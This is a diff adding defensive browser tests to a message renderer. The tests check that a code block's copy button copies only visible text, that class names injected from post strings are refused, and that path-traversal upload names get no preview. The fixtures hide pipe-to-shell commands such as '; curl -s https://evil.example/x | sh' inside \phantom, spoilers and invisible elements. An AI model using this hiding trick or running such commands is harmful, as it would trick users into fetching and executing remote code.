@@ -588,6 +588,51 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   // a formula in code: what KaTeX draws, without its MathML copy for screen readers and without the invisible \phantom
   const math = await copies({ html: '<pre>a <tg-math>x^2</tg-math> b<br>ls<tg-math>\\phantom{; curl -s https://evil.example/x | sh}</tg-math></pre>' });
   check('the copy icon copies a formula once, as drawn, and not its \\phantom', math.length === 1 && math[0].copied === 'a x2 b\nls', JSON.stringify(math));
+  // a class from a string of the post put .tg-cell-empty (visibility: hidden) on a button in the code (review of #202):
+  // the class is not set any more, and text CSS keeps invisible is not copied whatever hides it
+  const classed = [];
+  for (const rm of [{ html: '<pre>ls<tg-button-row align="c tg-cell-empty"><tg-button data="a">; curl evil|sh</tg-button></tg-button-row></pre>' },
+    { blocks: [{ type: 'pre', text: ['ls', { type: 'button', button: { text: '; curl evil|sh', style: 'x tg-cell-empty', callback_data: 'a' } }] }] }]) {
+    const got = await copies(rm);
+    const hiding = await page.evaluate(() => document.querySelectorAll('#out .tg-cell-empty').length);
+    if (got.length !== 1 || got[0].copied !== got[0].seen || hiding) classed.push(`${JSON.stringify(rm)}: ${JSON.stringify({ got, hiding })}`);
+  }
+  check('a class from the post hides nothing in code, and the copy is what is seen', classed.length === 0, classed.join('; '));
+  await render({ html: '<pre>ls<b>; curl evil|sh</b></pre>' });
+  const invisible = await page.evaluate(() => {
+    /** @type {HTMLElement} */ (document.querySelector('#out pre b')).style.visibility = 'hidden';
+    window.__copied = null;
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
+    return window.__copied;
+  });
+  check('the copy icon leaves out text with visibility: hidden', invisible === 'ls', JSON.stringify(invisible));
+  // a closed spoiler is a blot the reader cannot read: copied once it is open, all of it, nested formatting too
+  await render({ html: '<pre>ls<tg-spoiler>; curl <b>evil</b>|sh</tg-spoiler></pre>' });
+  const spoiler = await page.evaluate(() => {
+    const copy = () => { window.__copied = null; /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click(); return window.__copied; };
+    const closed = copy();
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-spoiler')).click();
+    return [closed, copy()];
+  });
+  check('the copy icon leaves out a closed spoiler and copies an open one whole', JSON.stringify(spoiler) === JSON.stringify(['ls', 'ls; curl evil|sh']), JSON.stringify(spoiler));
+}
+{
+  // a class name made of a string of the post is one word, else there is none (review of #202): «x tg-cell-empty» put
+  // the hiding class of tg.css on a button or a row of buttons
+  const classes = async (rm, extra) => {
+    await render(rm, extra);
+    return page.evaluate(() => [...document.querySelectorAll('#out .tg-btn-row, #out .tg-btn')].map((n) => n.className));
+  };
+  const blocks = await classes({ blocks: [{ type: 'buttons', align: 'c tg-cell-empty', buttons: [{ text: 'a', style: 'x tg-cell-empty', callback_data: 'a' }, { text: 'b', style: 'primary', callback_data: 'b' }] }, { type: 'buttons', align: 'right', buttons: [] }] },
+    { reply_markup: { inline_keyboard: [[{ text: 'k', style: 'danger tg-spoiler', callback_data: 'k' }]] } });
+  const html = await classes({ html: '<tg-button-row align="c tg-cell-empty"><tg-button data="a">a</tg-button></tg-button-row><tg-button-row align="left"><tg-button data="b">b</tg-button></tg-button-row>' });
+  check('blocks and html: align and style of buttons are a class only as one word',
+    JSON.stringify(blocks) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn tg-btn-primary', 'tg-btn-row tg-align-right', 'tg-btn'])
+    && JSON.stringify(html) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn-row tg-align-left', 'tg-btn']), JSON.stringify({ blocks, html }));
+  // upload:.. was /media/.., the page itself; a name is one file in the media folder
+  const srcs = await page.evaluate(() => ['upload:..', 'upload:.', 'upload:', 'upload:../api/check', 'upload:a/b.png', 'upload:a\\b.png', 'upload:a..b.png', 'upload:a.png']
+    .map((m) => RichRender.mediaSrc(m, {})));
+  check('upload: a name that is not one file has no preview', JSON.stringify(srcs) === JSON.stringify([null, null, null, null, null, null, '/media/a..b.png', '/media/a.png']), JSON.stringify(srcs));
 }
 
 // ---------- animation (GIF) ----------
